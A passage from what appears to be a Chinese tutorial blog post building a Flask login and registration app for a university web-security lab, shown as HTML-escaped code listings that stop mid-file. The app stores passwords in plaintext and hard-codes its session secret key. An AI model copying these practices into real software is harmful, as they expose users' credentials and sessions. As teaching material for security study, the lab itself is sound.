&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;lang&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;charset&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Web安全实验&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;Web安全实验&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Username: &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Password: &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;href&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;/register&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;Register&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;% if error %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;style&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;color: red&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&amp;#123;&amp;#123; error &amp;#125;&amp;#125;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;p&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;% endif %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;再创建一个 register.html，增加注册功能，源码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;lang&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;meta&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;charset&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Register&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;Register&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;h2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;/register&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Username: &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;newUsername&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Password: &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;newPassword&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;Register&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改 index.html，增加退出登录功能&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改 app.py 函数，代码原理：首先进入链接后检测是否成功登陆，如果没有成功登陆则跳转 login.html，login.html 包含 login 和 register，如果没有账号可以点击 register 跳转 register.html 来进行注册。然后在 login 输入账号密码登录成功后跳转 index.html，index.html 李有 logout 选项，点击 Logout 后会退出登录返回到 login.html 中。源码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; flask &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; Flask, render_template, request, redirect, url_for, session&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sqlite3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; werkzeug.utils &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; escape&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app.secret_key = &lt;span class=&#34;string&#34;&gt;&amp;#x27;fan_xing_yu_is_little_boy_mother&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 假设的评论数据集&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dataset = [&lt;span class=&#34;string&#34;&gt;&amp;quot;BIT网络安全课程真有趣&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Web安全演示实验打卡&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;祝同学们都能取得好成绩!&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 注册功能&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/register&amp;#x27;&lt;/span&gt;, methods=[&lt;span class=&#34;string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;register&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.method == &lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        new_username = request.form[&lt;span class=&#34;string&#34;&gt;&amp;#x27;newUsername&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        new_password = request.form[&lt;span class=&#34;string&#34;&gt;&amp;#x27;newPassword&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        connection = sqlite3.connect(&lt;span class=&#34;string&#34;&gt;&amp;#x27;login.db&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cursor = connection.cursor()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cursor.execute(&lt;span class=&#34;string&#34;&gt;&amp;quot;INSERT INTO users (username, password) VALUES (?, ?)&amp;quot;&lt;/span&gt;, (new_username, new_password))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        connection.commit()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        connection.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&#34;string&#34;&gt;&amp;#x27;login&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template(&lt;span class=&#34;string&#34;&gt;&amp;#x27;register.html&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;, methods=[&lt;span class=&#34;string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;index&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; session.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;logged_in&amp;#x27;&lt;/span&gt;):  &lt;span class=&#34;comment&#34;&gt;# 检查用户是否登录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&#34;string&#34;&gt;&amp;#x27;login&amp;#x27;&lt;/span&gt;))  &lt;span class=&#34;comment&#34;&gt;# 未登录，重定向到登录页面&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    query = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.method == &lt;span class=&#34;string&#34;&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.form.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;submit&amp;quot;&lt;/span&gt;) == &lt;span 